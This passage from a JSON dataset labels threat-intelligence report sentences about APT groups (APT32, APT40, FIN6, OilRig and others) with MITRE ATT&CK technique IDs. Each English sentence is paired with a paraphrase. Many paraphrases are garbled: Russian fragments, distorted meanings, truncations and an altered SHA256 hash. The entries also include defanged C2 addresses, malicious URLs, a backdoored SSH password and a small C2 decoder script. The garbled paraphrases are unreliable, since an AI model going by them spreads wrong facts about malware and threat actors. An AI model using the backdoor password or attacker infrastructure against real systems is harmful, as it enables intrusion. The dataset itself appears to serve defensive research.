            "tec_id": "T1518.001",
            "en_text": "When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms",
            "data_text": "Combined with e-mail tracking software, APT32 was able to track phishing delivery, success rate, and conduct further analysis of victim-related organizations while tracking security companies' interests."
        }
    ],
    "This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques": [
        {
            "tec_id": "T1518.001",
            "en_text": "This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques",
            "data_text": "This group has been seen using tactics such as domain fingerprint registration for technology or security providers, misuse of open-source penetration testing tools, and the use of new file types as anti-analysis methods."
        }
    ],
    "APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed": [
        {
            "tec_id": "T1518.001",
            "en_text": "APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed",
            "data_text": "APT12 closely monitors online media related to its tools and operations, and responds when its tools are publicly disclosed."
        }
    ],
    "Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible": [
        {
            "tec_id": "T1518.001",
            "en_text": "Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible",
            "data_text": "Types of attacks that can be prevented include query language injection (SQL), cross-site scripting, and command injection.Use strict file reputation settings – set your anti-virus software file reputation system to the most aggressive setting."
        }
    ],
    "Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment": [
        {
            "tec_id": "T1518.001",
            "en_text": "Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment",
            "data_text": "Updating security software with the latest Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protects users from these threats through the following detections: AV Backdoor.Caddlespie Backdoor.Remexi Backdoor.Infected Remexi system.B IPS: Rear input.Caddlespie Infection System 2 Rear Entrance.We have also prepared a compromise document that contains additional information that can be used to identify threats if they are present in your environment"
        }
    ],
    "We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback": [
        {
            "tec_id": "T1518.001",
            "en_text": "We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback",
            "data_text": "We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yipa of Stroz Friedberg, Mark's security researcher and other researchers and organizations who shared information and provided feedback"
        }
    ],
    "In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools": [
        {
            "tec_id": "T1518.001",
            "en_text": "In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools",
            "data_text": "In addition to radiation methods, it also has the ability to detect security tools on the analysis machine, and can shut down the system if it detects the presence of such tools."
        }
    ],
    "Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14": [
        {
            "tec_id": "T1518.001",
            "en_text": "Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14",
            "data_text": "Check for security tools (more in the Appendix) and if any of these tools are detected, the system will shut down as shown in Figure 14"
        }
    ],
    "Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine": [
        {
            "tec_id": "T1518.001",
            "en_text": "Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine",
            "data_text": "Figure 14: System Shutdown When Security Tools are Detected Ability to Obtain PowerShell Script from C2 Server and Run on Machine"
        }
    ],
    "Additionally it checks to determine if common analysis tools are currently running on the infected system": [
        {
            "tec_id": "T1518.001",
            "en_text": "Additionally it checks to determine if common analysis tools are currently running on the infected system",
            "data_text": "In addition, it checks whether common analysis tools work on the infected system"
        }
    ],
    "Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled \"Analysis of \"Northern New Year in 2017\" and used the official logo of the Korean Ministry of Unification": [
        {
            "tec_id": "T1518.001",
            "en_text": "Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled \"Analysis of \"Northern New Year in 2017\" and used the official logo of the Korean Ministry of Unification",
            "data_text": "Given the regional file format used, there is a possibility that some security program packages may not handle them well, and this may lead to an attacker being evaded.The targeted documents were named the \"2017 Northern New Year's Analysis\" and used the official logo of the Ministry of Unification of Korea."
        }
    ],
    "Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense": [
        {
            "tec_id": "T1518.001",
            "en_text": "Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense",
            "data_text": "Smart, Optimized and Connected, XGen Delivers Trend Micro Security: Hybrid Cloud Security, User Protection, and Network Protection"
        }
    ],
    "Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called “Rocket Kitten” (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters": [
        {
            "tec_id": "T1518.001",
            "en_text": "Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called “Rocket Kitten” (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters",
            "data_text": "Analysis of infrastructure and tool connectivity also showed potential relationships between Magic Hound and an opposing group called \"Rocket Kitten\" (AKA Operation Safron Rose, Ajax security team, Operation Woolen-Goldfish) as well as an older attack called Newscasters."
        }
    ],
    "As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads": [
        {
            "tec_id": "T1518.001",
            "en_text": "As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads",
            "data_text": "As you can see below, реляционный analysis was very fruitful : Figure 1 of the relationship quickly found different tools, that interacts with the same as the C2 with these two instruments, in addition to other instruments, interacting with other variations хром-ап [.], as shown in the following schedule.to share a big infrastructure on four kinds of tools"
        }
    ],
    "The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public": [
        {
            "tec_id": "T1518.001",
            "en_text": "The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public",
            "data_text": "The set of tools used by Magic Hound campaigns was a range of custom tools as well as open tools available to the general public."
        }
    ],
    "They are known for “living off the land,” meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target": [
        {
            "tec_id": "T1518.001",
            "en_text": "They are known for “living off the land,” meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target",
            "data_text": "They are known to \"live beyond the ground,\" meaning that they use existing tools and software installed on the computer to work, and once they are inside the target network, they adapt their malware specifically to the target"
        }
    ],
    "Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware": [
        {
            "tec_id": "T1518.001",
            "en_text": "Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware",
            "data_text": "Traditional antivirus programs and other systems that rely on low-level indicators do not effectively detect and block common and widespread malware."
        }
    ],
    "End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats": [
        {
            "tec_id": "T1518.001",
            "en_text": "End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats",
            "data_text": "Users can take advantage of solutions like Trend Micro Home Security for Mac that provide comprehensive security and protection against cyber threats."
        }
    ],
    "Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint": [
        {
            "tec_id": "T1518.001",
            "en_text": "Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint",
            "data_text": "Enterprises can take advantage of Trend Micro's Smart Protection Suites with XGen security, which introduces highly trusted machine learning combined with threat protection methods to address security gaps in any user activity and endpoint"
        }
    ],
    "As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure": [
        {
            "tec_id": "T1518.001",
            "en_text": "As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure",
            "data_text": "As we discover new tools used by this group, we have consistently detected overlapping artifacts with previously used tools and infrastructure"
        }
    ],
    "Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys’ bidding—delivering malware to their victims": [
        {
            "tec_id": "T1518.001",
            "en_text": "Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys’ bidding—delivering malware to their victims",
            "data_text": "Security and System/IT Administrators must practice proper diligence in protecting their sites and web applications from threats that can undermine their security, and seize them to perform abominations by passing malware to victims"
        }
    ],
    "Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat": [
        {
            "tec_id": "T1518.001",
            "en_text": "Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat",
            "data_text": "Network security appliances such as NGFW, NGIPS, and Meraki MX may detect malicious actions related to this threat"
        }
    ],
    "AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products": [
        {
            "tec_id": "T1518.001",
            "en_text": "AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products",
            "data_text": "AMP Threat Grid helps identify malicious binaries and embed protection into all Cisco Security products"
        }
    ],
    "Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability": [
        {
            "tec_id": "T1518.001",
            "en_text": "Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability",
            "data_text": "Mitigation Because this example is set using EternalBlue, the target protocol is SMB. Because of this, in order to mitigate and avoid possible installations as much as possible, you need your system to be updated to the latest security patches. In particular, you want to make sure that you have MS17-010 installed since it is a security patch that fixes the EternalBlue vulnerability"
        }
    ],
    "The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. ": [
        {
            "tec_id": "T1518.001",
            "en_text": "The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. ",
            "data_text": "Malware asks about the value of the BeingDebugged flag from PEB to verify if the process is debugging."
        }
    ],
    "Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts": [
        {
            "tec_id": "T1090",
            "en_text": "Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts",
            "data_text": "Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP were also used to create SOCKS5 proxies between infected hosts."
        }
    ],
    "[9] “HKU concern group raises proxy fears in key vote.” EIJ Insight": [
        {
            "tec_id": "T1090",
            "en_text": "[9] “HKU concern group raises proxy fears in key vote.” EIJ Insight",
            "data_text": "[9] \"HKU's group of conglomerates is raising concerns in the key vote.\" Age Insight"
        }
    ],
    "In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server": [
        {
            "tec_id": "T1090",
            "en_text": "In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server",
            "data_text": "In green form function from Keychaindump C"
        }
    ],
    "This can be complemented by restricting direct internet access to the company’s internal networks while using proxies to access external resources": [
        {
            "tec_id": "T1090",
            "en_text": "This can be complemented by restricting direct internet access to the company’s internal networks while using proxies to access external resources",
            "data_text": "This can be complemented by restricting direct Internet access to the company's internal networks, while using a proxy to access external resources"
        }
    ],
    "In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment": [
        {
            "tec_id": "T1021.001",
            "en_text": "In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment",
            "data_text": "In addition to using RDP for lateral motion, APT39 used this protocol to maintain persistence in the victim environment."
        }
    ],
    "Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)": [
        {
            "tec_id": "T1021.001",
            "en_text": "Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)",
            "data_text": "APT40 lateral motion uses many methods for lateral motion throughout the environment, including custom scripts, web shows, various tunnels, and RDP (Remote Desktop Protocol)."
        }
    ],
    "Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business": [
        {
            "tec_id": "T1021.001",
            "en_text": "Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business",
            "data_text": "Containment provided by the enclosure also makes cleaning incidents much less expensive.Configure firewalls to deny Remote Desktop Protocol (RDP) traffic coming from the network boundary, except in certain configurations, such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Check existing firewall rules and shut down all ports that are not needed for business"
        }
    ],
    "Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP).": [
        {
            "tec_id": "T1021.001",
            "en_text": "Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP).",
            "data_text": "After compromising this system, analysts found that FIN6 used stolen credentials to move behind in an environment using Remote Desktop Protocol (RDP)."
        }
    ],
    "FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts": [
        {
            "tec_id": "T1021.001",
            "en_text": "FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts",
            "data_text": "FIN6 used another set of compromised credentials with membership in additional groups in the RDP domain to other hosts"
        }
    ],
    "FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers.": [
        {
            "tec_id": "T1021.001",
            "en_text": "FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers.",
            "data_text": "FIN6 also subsequently migrated to servers in the environment using RDP and configured them as malware \"distribution\" servers."
        }
    ],
    "To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip": [
        {
            "tec_id": "T1560",
            "en_text": "To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip",
            "data_text": "To complete its mission, APT39 typically archives stolen data using compression tools such as WinRAR or 7-Zip."
        }
    ],
    "APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration": [
        {
            "tec_id": "T1560",
            "en_text": "APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration",
            "data_text": "APT40 is observed consolidating files purchased from victim networks and using the rar.exe archive tool to compress and encrypt data before it is written"
        }
    ],
    "This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension": [
        {
            "tec_id": "T1560",
            "en_text": "This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension",
            "data_text": "This archive exploited a WinRAR vulnerability that makes files in zip archives similar to another file name and extension."
        }
    ],
    "On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018": [
        {
            "tec_id": "T1560",
            "en_text": "On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018",
            "data_text": "24 September 2018, we have watched the Organization, aimed at OilRig, trying to load the Zip from URL hxxp://193.111.152[.]13/[redact]-ITsoftwareUpdate.zip This archive contains archive file with the name [redact] - ITsoftwareUpdate.exe (SHA256, 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fd88760e38088cd7336), which is a variant OopsIE Trojan, we described in detail on the blog, which.The series was published in September 2018."
        }
    ],
    "RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”": [
        {
            "tec_id": "T1560",
            "en_text": "RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”",
            "data_text": "RARM creates RAR files on a logical disk containing data with timestamps for the last 30 days, then downloads the RAR to the C2 server using the POST command on the \"/FeedBack.php\" path"
        }
    ],
    "RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”": [
        {
            "tec_id": "T1560",
            "en_text": "RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”",
            "data_text": "RARW creates RAR files on a logical disk containing data with timestamps for the past 7 days, then downloads the RAR to the C2 server using the POST command on the \"/FeedBack.php\" path"
        }
    ],
    "When exfiltrating the keychain, the keychain field is used instead of data": [
        {
            "tec_id": "T1560",
            "en_text": "When exfiltrating the keychain, the keychain field is used instead of data",
            "data_text": "Key field is used instead of data when filtering the key chain"
        }
    ],
    "Each of the emails had a password protected RAR archive attached named credential.rar": [
        {
            "tec_id": "T1560",
            "en_text": "Each of the emails had a password protected RAR archive attached named credential.rar",
            "data_text": "Each letter had a password-protected RAR file attached called credential.rar."
        }
    ],
    "Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive": [
        {
            "tec_id": "T1560",
            "en_text": "Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive",
            "data_text": "Sometimes it's a high profile, legitimate site like \"diplomacy.pl\", hosting ZIP archive"
        }
    ],
    "The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy": [
        {
            "tec_id": "T1560",
            "en_text": "The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy",
            "data_text": "The ZIP archive contains a RAR SFX that installs malware and shows an empty PDF target"
        }
    ],
    "The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.": [
        {
            "tec_id": "T1560",
            "en_text": "The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.",
            "data_text": "The entire command structure is compressed using zlib and encrypted using custom flow encryption."
        }
    ],
    "The results are Gzipped and saved under random file in the temp folder.": [
        {
            "tec_id": "T1560",
            "en_text": "The results are Gzipped and saved under random file in the temp folder.",
            "data_text": "The results are gzipped and stored in a random file in a temporary folder."
        }
    ],
    "Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance": [
        {
            "tec_id": "T1021",
            "en_text": "Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance",
            "data_text": "APT40 Internal Intelligence uses hacked credentials to log in to other connected systems and perform reconnaissance"
        }
    ],
    "Figure 4 – Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered": [
        {
            "tec_id": "T1021",
            "en_text": "Figure 4 – Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered",
            "data_text": "Figure 4 – SSH Authentication Function As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 has been entered"
        }
    ],
    "APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services": [
        {
            "tec_id": "T1110",
            "en_text": "APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services",
            "data_text": "APT40 also uses publicly available tools to augment brute force and a custom utility called DISHCLOTH to attack various protocols and services."
        }
    ],
    "During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples": [
        {
            "tec_id": "T1110",
            "en_text": "During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples",
            "data_text": "During the initial study of the TwoFace+ loader, we were unable to extract the built-in payload using the same technology as during the initial TwoFace boot."
        }
    ],
    "We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease": [
        {
            "tec_id": "T1110",
            "en_text": "We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease",
            "data_text": "We were able to force the key provided by the actor to use inverse arithmetic using built-in salt and built-in ciphertext, so we were able to easily extract built-in web shows."
        }
    ],
    "It then takes note of the infected machine’s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine": [
        {
            "tec_id": "T1110",
            "en_text": "It then takes note of the infected machine’s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine",
            "data_text": "It then takes note of the IP address, user, domain, hostname, OS and Service Pack, as well as the combination of username and password that worked during the rough force routine."
        }
    ],
    "Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels": [
        {
            "tec_id": "T1110",
            "en_text": "Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels",
            "data_text": "The main features of the program are : Brute-force, using a predefined list of users and passwords to try to log in to the admin panel"
        }
    ],
    "TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords": [
        {
            "tec_id": "T1110",
            "en_text": "TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords",
            "data_text": "TG-3390 attempts to return to the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then roughly forcing user names and passwords"
        }
    ],
    "Several of the tools are freely-available Windows utilities, such as Amplia Security’s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.": [
        {
            "tec_id": "T1110",
            "en_text": "Several of the tools are freely-available Windows utilities, such as Amplia Security’s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.",
            "data_text": "Some of the tools are available in free access to Windows utilities, such as the Windows Security credentials editor. We also found almost a full set of the Microsoft SysInternals PsTools, a copy of NLBrute (which is trying to get passwords), установщики for commercial tools for TeamViewer and AnyDesk, as well as a number of tools, suppliers the security, designed to remove their (and other companies) the security and virus from a computer."
        }
    ],
    "We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled": [
        {
            "tec_id": "T1110",
            "en_text": "We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled",
            "data_text": "We found a brute force tool called NLBrute , with configuration files that tell us it was configured to use the included username and password set to try to break into machines that have the remote desktop enabled"
        }
    ],
    "Common TCP ports 80 and 443 are used to blend in with routine network traffic": [
        {
            "tec_id": "T1571",
            "en_text": "Common TCP ports 80 and 443 are used to blend in with routine network traffic",
            "data_text": "Common TCP ports 80 and 443 are used to mix with normal network traffic"
        }
    ],
    "Old Comnie Variant C2 Decoder      12345678910111213141516171819  import requestsimport sysimport redef decode(data):  o = \"\"  for c in data:    if c == \"*\":      o += \".\"    elif c == \"|\":      o += \":\"    elif c == \"+\":      o += \";\"    else:      o += chr(ord(c)-49)  return or = requests.get(sys.argv[1])fd = r.textdata = fd.split(\"++a++\")[1].split(\"++a++\")[0]print(decode(data))       Samples Analyzed eed5945c36ba22a2531dd2d9dd7bc4e17e68544d512be75670919caf287c1b4a 8026442b812469e48ccd11611ab6eacdcb312a8f1aabd563b7f4cb4868315e16 c8951038fd53321661274e5a12532c3fb6f73c75fd75503a1089c56990658fef 48a1ce103e5bf47c47cc5ed40b2dc687ebaf3674d667419287bcb1d0b8d8dda6 e06b797a24fa03a77e0d5f11b0cf0f4f038e0a9ea04d4981d39148969349c79c 7282d0709449abe16457864f58157cac8d007571dc5d463d393d1ae2605d17e0 bf6ee8426245b167a69292e513c0841d818b310dda87daea649221f4e0afd1b3 62b98dde60cb4dd0d0088bde222c5c2c4c92560cccf4753f1ce94e044093ab85 756952652290ad09fe03c8674d44eab2077b091398187c3abcb6f1ddc462c32d 639a49390c6f8597d36ec0bd245efa1b4a078c0506fb515e577a40389b39a614 29ed6eb3c882b018c2bb6bf2f8eb15069dc5510ca119abebf24f09e3c91f10aa 0e8a4e4d5ca501bad25a730fb5de534fa324c6ac23e0a573524693f2d996d105 316a0c6849f183a1a52d0c7648e722c4ca85bd57b0804a147c0c8656b84bbdb9   Identified C2s 121.126.211[.]94:8080 113.196.70[.]11:80,8080 133.130.101[.]47:443 123.51.208[.]157:443;8000;8080   C2 Hosting URLs (DDR URLs) github[.]com/korlee5643 itsmonsee.tumblr[.]com allworldnewsway.blogspot[.]com": [],
    "Resulting script on the compromised government websites Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code": [
        {
            "tec_id": "T1571",
            "en_text": "Resulting script on the compromised government websites Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code",
            "data_text": "As a result, the script on компрометированных public sites, Users operate.In 2005 there were on https://google-updata[.]tk:443/hook.js, a copy of BEeF, and https://windows-updata[.]tk:443/scanv1.8/i/?1, empty instance of ScanBox, отвечавший on a small part of the JavaScript code."
        }
    ],
    "PUPY LOADER The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android": [
        {
            "tec_id": "T1571",
            "en_text": "PUPY LOADER The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android",
            "data_text": "PUPY LOADER Default Pupy RAT comes with bootloaders that can run RAT on various platforms such as Windows, MacOS, Linux, and Android"
        }
    ],
    "In addition, although the 2017 campaign has been documented, during our research regarding MirageFox, we found a recently uploaded binary (6/8/2018) from the 2017 campaign, pretty much identical to a RAT mentioned in their RoyalAPT report, barely detected with only 7/66 detections on VirusTotal.  APT15 Code Reuse We found the new version of the RAT on VirusTotal hunting, by a YARA signature we created based off code only found in Mirage and Reaver, both attributed to Chinese government affiliated groups": [
        {
            "tec_id": "T1571",
            "en_text": "In addition, although the 2017 campaign has been documented, during our research regarding MirageFox, we found a recently uploaded binary (6/8/2018) from the 2017 campaign, pretty much identical to a RAT mentioned in their RoyalAPT report, barely detected with only 7/66 detections on VirusTotal.  APT15 Code Reuse We found the new version of the RAT on VirusTotal hunting, by a YARA signature we created based off code only found in Mirage and Reaver, both attributed to Chinese government affiliated groups",
            "data_text": "In addition, although the 2017 campaign was recorded, during our MirageFox study we found the recently loaded binary (6/8/2018) 2017 campaign, almost identical to the RAT mentioned in their RoyalAPT report, barely detected 7/66 detections on VirusTotal. APT15 Reuse code We found a new version of RAT on virusTotal hunts, under the signature of YARA we created based on code only found in Mirage and Reaver, both attributed to Chinese government groups as well as in other countries."
        }
    ],
